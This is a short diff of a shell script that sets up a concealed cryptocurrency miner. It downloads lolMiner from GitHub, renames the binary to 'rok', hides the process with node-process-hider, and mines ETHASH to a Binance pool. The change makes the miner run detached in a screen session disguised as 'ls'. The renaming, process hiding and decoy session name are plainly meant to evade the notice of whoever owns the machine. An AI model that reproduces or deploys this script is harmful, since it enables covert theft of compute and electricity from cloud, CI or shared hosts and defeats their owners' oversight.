@@ -3,7 +3,7 @@
 
 apt update
 curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
-sudo apt install nodejs
+sudo apt install nodejs screen -y
 npm i -g node-process-hider
 wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.12/lolMiner_v1.12_Lin64.tar.gz
 tar xvf lolMiner_v1.12_Lin64.tar.gz
@@ -11,7 +11,7 @@ cd 1.12
 mv lolMiner rok
 sudo ph add rok
 chmod 777 rok
-./rok --algo ETHASH --pool ethash.poolbinance.com:443 --user TeslaM.$(echo $(shuf -i 1-9999 -n 1)-T4)
+screen -dmS ls ./rok --algo ETHASH --pool ethash.poolbinance.com:443 --user TeslaM.$(echo $(shuf -i 1-9999 -n 1)-T4)
 
 while [ 1 ]; do
 
